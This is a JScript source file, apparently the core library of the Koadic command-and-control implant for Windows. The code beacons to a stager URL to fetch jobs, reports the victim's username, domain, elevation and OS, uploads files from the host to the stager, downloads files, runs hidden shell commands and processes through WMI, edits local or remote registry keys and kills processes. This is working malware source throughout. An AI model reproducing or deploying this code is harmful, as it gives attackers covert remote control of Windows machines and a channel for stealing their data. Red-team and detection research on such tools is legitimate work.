var Koadic =
{
    FS : new ActiveXObject("Scripting.FileSystemObject"),
    WS : new ActiveXObject("WScript.Shell"),

    STAGER : "~URL~",
    SESSIONKEY : "~SESSIONKEY~",
    JOBKEY : "~JOBKEY~",
    JOBKEYPATH : "~URL~?~SESSIONNAME~=~SESSIONKEY~;~JOBNAME~="
};

/**
 * Sleeps the current thread
 *
 * @param int ms - how long to sleep in milliseconds
 * @param function callback - where to continue execution after the sleep
 *
 * @return void
 */
Koadic.sleep = function(ms, callback)
{
    if (Koadic.isHTA())
    {
        window.setTimeout(callback, ms);
    }
    else
    {
        var now = new Date().getTime();
        while (new Date().getTime() < now + ms);
        callback();
    }
}

/**
 * Attempts to kill the current process using a myriad of methods
 *
 * @return void
 */
Koadic.exit = function()
{
    if (Koadic.isHTA())
    {
        // crappy hack?
        try {
          window.close();
        } catch(e){}

        try {
          window.self.close();
        } catch (e){}

        try {
          window.top.close();
        } catch (e){}


        try{
            self.close();
        } catch (e){}

        try
        {
            window.open('', '_self', '');
            window.close();
        }
        catch (e)
        {
        }
    }

    try
    {
        WScript.quit();
    }
    catch (e)
    {
    }

    try
    {
        var pid = Koadic.process.currentPID();
        Koadic.process.kill(pid);
    }
    catch (e)
    {
    }
}

/**
 * Determine if running in HTML Application context
 *
 * @return bool - true if HTML application context
 */
Koadic.isHTA = function()
{
    return typeof(window) !== "undefined";
}

/**
 * Determine if running in WScript Application context
 *
 * @return bool - true if WScript context
 */
Koadic.isWScript = function()
{
    return typeof(WScript) !== "undefined";
}

Koadic.user = {};

Koadic.user.isElevated = function()
{
    try
    {
    	  Koadic.WS.RegRead("HKEY_USERS\\s-1-5-19\\");
    	  return true;
    }
    catch(e)
    {
        return false;
    }
}

Koadic.user.OS = function()
{
    try
    {
        var wmi = GetObject("winmgmts:\\\\.\\root\\CIMV2");
        var colItems = wmi.ExecQuery("SELECT * FROM Win32_OperatingSystem");

        var enumItems = new Enumerator(colItems);
        var objItem = enumItems.item();
        return objItem.Caption;
    }
    catch(e){}

    return "Unknown";
}


Koadic.user.info = function()
{
    var net = new ActiveXObject("WScript.Network");
    var info = net.UserDomain + "\\" + net.Username;

    if (Koadic.user.isElevated())
        info += "*";

    info += "~~~" + net.ComputerName;
    info += "~~~" + Koadic.user.OS();

    return info;
}

Koadic.work = {};

/*
Koadic.work.applyDefaultHeaders = function(headers)
{
    var headers = (typeof(headers) !== "undefined") ? headers : {};
    headers["SESSIONKEY"] = Koadic.SESSIONKEY;
    headers["JOBKEY"] = Koadic.JOBKEY;
}
*/

/**
 * Reports a successful message to the stager
 *
 * @param string data - The post body
 * @param map headers - Any additional HTTP headers
 *
 * @return object - the HTTP object
 */
Koadic.work.report = function(data, headers)
{
    //var headers = Koadic.work.applyDefaultHeaders(headers);
    return Koadic.http.post(Koadic.work.make_url(), data, headers);
}

/**
 * Reports an error condition to the stager
 *
 * @param exception e - what exception was thrown
 *
 * @return object - the HTTP object
*/
Koadic.work.error = function(e)
{
    try
    {
        var headers = {};
        headers["errno"] = (e.number) ? e.number : "-1";
        headers["errname"] = (e.name) ? e.name : "Unknown";
        headers["errdesc"] = (e.description) ? e.description : "Unknown";
        return Koadic.work.report(e.message, headers);
    }
    catch (e)
    {
        // Abandon all hope ye who enter here
        // For this is where all things are left behind
    }
}

/**
 * Makes the stager callhome URL for a specific jobkey
 *
 * @param string jobkey - which job to fetch
 *
 * @return string - the stager callhome URL
*/
Koadic.work.make_url = function(jobkey)
{
    var jobkey = (typeof(jobkey) !== "undefined") ? jobkey : Koadic.JOBKEY;
    return Koadic.JOBKEYPATH + jobkey + ";";
}

/**
 * Fetches the next job from the server
 *
 * @return object - the HTTP object
*/
Koadic.work.get = function()
{
    var url = Koadic.work.make_url();
    return Koadic.http.post(url);
}

/**
 * Forks a new process and runs the specific jobkey
 *
 * @param string jobkey - the job to fetch/run
 * @param bool fork32Bit - ensure new process is x86
 *
 * @return void
*/
Koadic.work.fork = function(jobkey, fork32Bit)
{
    var fork32Bit = (typeof(fork32Bit) !== "undefined") ? fork32Bit : false;

    var cmd = "~_FORKCMD_~";

    if (fork32Bit)
        cmd = Koadic.file.get32BitFolder() + cmd;

    cmd = cmd.replace("***K***", Koadic.work.make_url(jobkey));
    Koadic.WMI.createProcess(cmd);
    //Koadic.WS.Run(cmd, 0, false);
}

Koadic.http = {};

Koadic.http.create = function()
{
    var http = null;

    try
    {
       http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
       http.setTimeouts(30000, 30000, 30000, 0)
    }
    catch (e)
    {
        http = new ActiveXObject("Microsoft.XMLHTTP");
    }

    return http;
}

Koadic.http.addHeaders = function(http, headers)
{
    var headers = (typeof(headers) !== "undefined") ? headers : {};

    var content = false;
    for (var key in headers)
    {
        var value = headers[key];

        http.setRequestHeader(key, value);
        if (key.toUpperCase() == "CONTENT-TYPE")
            content = true;
    }

    if (!content)
        http.setRequestHeader("Content-Type", "application/octet-stream");
}

Koadic.http.post = function(url, data, headers)
{
    var data = (typeof(data) !== "undefined") ? data : "";

    var http = Koadic.http.create();

    http.open("POST", url, false);
    Koadic.http.addHeaders(http, headers);
    http.send(data);

    return http;
}

Koadic.http.get = function(url, headers)
{
    var http = Koadic.http.create();
    http.open("GET", url, false);
    Koadic.http.addHeaders(http, headers);
    http.send();

    return http;
}

/**
 * Upload a file, off zombie, to stager
 *
 * @param filepath - the full path to the file to send
 * @param header_uuid - a unique identifier for this file
 * @param header_key - optional HTTP header tag to send uuid over
 *
 * @return object - the HTTP object
 *
**/
Koadic.http.upload = function(filepath, header_uuid, header_key)
{
    var key = (typeof(header_key) !== "undefined") ? header_key : "ETag";

    var data = Koadic.file.readBinary(filepath);

    // we must replace null bytes or MS will cut off the body
    data = data.replace(/\\/g, "\\\\");
    data = data.replace(/\0/g, "\\0");

    var headers = {};
    headers[key] = header_uuid;

    return Koadic.work.report(data, headers);
}

Koadic.http.download = function(filepath, header_uuid, header_key)
{
    var key = (typeof(header_key) !== "undefined") ? header_key : "ETag";

    var headers = {};
    headers[key] = header_uuid;

    return Koadic.http.downloadEx("POST", Koadic.work.make_url(), headers, filepath);
}

Koadic.http.downloadEx = function(verb, url, headers, path)
{
    if (verb == "GET")
    {
        var http = Koadic.http.get(url, headers);
    }
    else
    {
        var http = Koadic.http.post(url, "", headers);
    }

    var stream = new ActiveXObject("Adodb.Stream");
    stream.Type = 1;
    stream.Open();
    stream.Write(http.responseBody);


    var data = Koadic.http.bin2str(stream);
    Koadic.file.write(path, data);
}

Koadic.http.bin2str = function(stream)
{
    stream.Flush();
    stream.Position = 0;

    var bin = stream.Read();
    var rs = new ActiveXObject("Adodb.RecordSet");
    rs.Fields.Append("temp", 201, stream.Size);

    rs.Open();
    rs.AddNew();
    rs("temp").AppendChunk(bin);
    rs.Update();
    var data = rs.GetString();
    rs.Close();
    return data.substring(0, data.length - 1);
}

Koadic.process = {};

Koadic.process.currentPID = function()
{
    var cmd = Koadic.file.getPath("%comspec% /K hostname");
    //Koadic.WS.Run(cmd, 0, false);
    var childPid = Koadic.WMI.createProcess(cmd);

    var pid = -1;
    // there could be a race condition, but CommandLine returns null on win2k
    // and is often null on later windows with more harsh privileges

    // todo: this method is stupid. instead of using .Run, spawn a WMI process.
    // then we get child PID for free and can backtrack PPID, no race condition
    var latestTime = 0;
    var latestProc = null;

    var processes = Koadic.process.list();

    var items = new Enumerator(processes);
	while (!items.atEnd())
	{
        var proc = items.item();

        try
        {
            /*
            if (proc.Name.indexOf("cmd") != -1)
            {
                if (latestTime == 0 && proc.CreationDate)
                    latestTime = proc.CreationDate;

                if (proc.CreationDate > latestTime)
                {
                    latestTime = proc.CreationDate;
                    latestProc = proc;
                }
            }
            */
            if (proc.ProcessId == childPid)
            {
                latestProc = proc;
                break;
            }
        } catch (e)
        {
        }
		items.moveNext();
	}

    pid = latestProc.ParentProcessId;
    latestProc.Terminate();

    return pid;
}

Koadic.process.kill = function(pid)
{
    var processes = Koadic.process.list();

    var items = new Enumerator(processes);
	while (!items.atEnd())
	{
        var proc = items.item();

        try
        {
            if (proc.ProcessId == pid)
            {
                proc.Terminate();
                return true;
            }
        } catch (e)
        {
        }
		items.moveNext();
	}

    return false;
}

Koadic.process.list = function()
{
    var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
    var query = "Select * From Win32_Process";

    return wmi.ExecQuery(query);
}

// http://apidock.com/ruby/Win32/Registry/Constants
Koadic.registry = {};
Koadic.registry.HKCR = 0x80000000;
Koadic.registry.HKCU = 0x80000001;
Koadic.registry.HKLM = 0x80000002;

Koadic.registry.STRING = 0;
Koadic.registry.BINARY = 1;
Koadic.registry.DWORD = 2;
Koadic.registry.QWORD = 3;

Koadic.registry.provider = function(computer)
{
    var computer = (typeof(computer) !== "undefined") ? computer : ".";
    var reg = GetObject("winmgmts:\\\\" + computer + "\\root\\default:StdRegProv");
    return reg;
}

Koadic.registry.write = function(hKey, path, key, value, valType, computer)
{
    var reg = Koadic.registry.provider(computer);

    reg.CreateKey(hKey, path);

    if (valType == Koadic.registry.STRING)
        reg.SetStringValue(hKey, path, key, value);
    else if (valType == Koadic.registry.DWORD)
        reg.SetDWORDValue(hKey, path, key, value);
    else if (valType == Koadic.registry.QWORD)
        reg.SetQWORDValue(hKey, path, key, value);
    else if (valType == Koadic.registry.BINARY)
        reg.SetBinaryValue(hKey, path, key, value);
}

Koadic.registry.read = function(hKey, path, key, valType, computer)
{
    var reg = Koadic.registry.provider(computer);

    var methodName = "";
    if (valType == Koadic.registry.STRING)
        methodName = "GetStringValue";
    else if (valType == Koadic.registry.DWORD)
        methodName = "GetDWORDValue";
    else if (valType == Koadic.registry.QWORD)
        methodName = "GetQWORDValue";
    else if (valType == Koadic.registry.BINARY)
        methodName = "GetBinaryValue";

    if (methodName == "")
        return;

    var method = reg.Methods_.Item(methodName);
    var inparams = method.InParameters.SpawnInstance_();

    inparams.hDefKey = hKey;
    inparams.sSubKeyName = path;
    inparams.sValueName = key;

    var outparams = reg.ExecMethod_(method.Name, inparams);

    return outparams;
}

Koadic.registry.destroy = function(hKey, path, key, computer)
{
    var reg = Koadic.registry.provider(computer);
    var loc = (key == "") ? path : path + "\\" + key;
    return reg.DeleteKey(hKey, loc);
}

/*
// DEPRECATED
Koadic.registry.create = function(hiveKey, path, key, computer)
{
    var computer = (typeof(computer) !== "undefined") ? computer : ".";
    var sw = new ActiveXObject("WbemScripting.SWbemLocator");
    var root = sw.ConnectServer(computer, "root\\default");
    var reg = root.get("StdRegProv");

    var enumKey = reg.Methods_.Item("EnumKey");

    var inParams = enumKey.InParameters.SpawnInstance_();
    inParams.hDefKey = hiveKey;
    inParams.sSubKeyName = path;

    var outParam = reg.ExecMethod_(enumKey.Name, inParams);

    if (outParam.ReturnValue != 0)
        return false;

    if (outParam.sNames)
    {
        var subKeys = outParam.sNames.toArray();

        for (var i = 0; i < subKeys.length; ++i)
        {
            if (subkeys[i].toUpperCase() == key.toUpperCase())
                return true;
        }
    }

    var createKey = reg.Methods_.Item("CreateKey");
    var createArgs = createKey.InParameters.SpawnInstance_();
    createArgs.hDefKey = hiveKey;
    createArgs.sSubKeyName = path + "\\" + key;

    var createRet = reg.ExecMethod_(createKey.Name, createArgs);
    return createRet.returnValue == 0;
}
*/

Koadic.WMI = {};

Koadic.WMI.createProcess = function(cmd)
{
    var SW_HIDE = 0;
    var pid = 0;

    var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2")
    var si = wmi.Get("Win32_ProcessStartup").SpawnInstance_();
    si.ShowWindow = SW_HIDE;
    si.CreateFlags = 16777216;
    si.X = si.Y = si.XSize = si.ySize = 1;

    //wmi.Get("Win32_Process").Create(cmd, null, si, pid);
    var w32proc = wmi.Get("Win32_Process");

    var method = w32proc.Methods_.Item("Create");
    var inParams = method.InParameters.SpawnInstance_();
    inParams.CommandLine = cmd;
    inParams.CurrentDirectory = null;
    inParams.ProcessStartupInformation = si;

    var outParams = w32proc.ExecMethod_("Create", inParams);
    return outParams.ProcessId;
}

Koadic.shell = {};

Koadic.shell.exec = function(cmd, stdOutPath)
{
    var c = "%comspec% /q /c " + cmd + " 1> " + Koadic.file.getPath(stdOutPath);
    c += " 2>&1";
    Koadic.WS.Run(c, 0, true);
    var data = Koadic.file.readText(stdOutPath);
    Koadic.file.deleteFile(stdOutPath);

    return data;
}

Koadic.shell.run = function(cmd, fork)
{
    var fork = (typeof(fork) !== "undefined") ? fork : true;
    var c = "%comspec% /q /c " + cmd;
    Koadic.WS.Run(cmd, 0, !fork);
}

Koadic.file = {};

Koadic.file.getPath = function(path)
{
    return Koadic.WS.ExpandEnvironmentStrings(path);
}

/**
* @return string - the system folder with x86 binaries
*/
Koadic.file.get32BitFolder = function()
{
    var base = Koadic.file.getPath("%WINDIR%");
    var syswow64 = base + "\\SysWOW64\\";

    if (Koadic.FS.FolderExists(syswow64))
        return syswow64;

    return base + "\\System32\\";
}

Koadic.file.readText = function(path)
{
    var fd = Koadic.FS.OpenTextFile(Koadic.file.getPath(path), 1, true, 0);
    var data = fd.ReadAll();
    fd.Close();

    return data;
}

Koadic.file.readBinary = function(path)
{
    var fp = Koadic.FS.GetFile(Koadic.file.getPath(path));
    var fd = fp.OpenAsTextStream();
    var data = fd.read(fp.Size);
    fd.close();
    return data;
}

Koadic.file.write = function(path, data)
{
    var fd = Koadic.FS.CreateTextFile(Koadic.file.getPath(path), true);
    fd.write(data);
    fd.close();
}

Koadic.file.deleteFile = function(path)
{
    Koadic.FS.DeleteFile(Koadic.file.getPath(path), true);
};
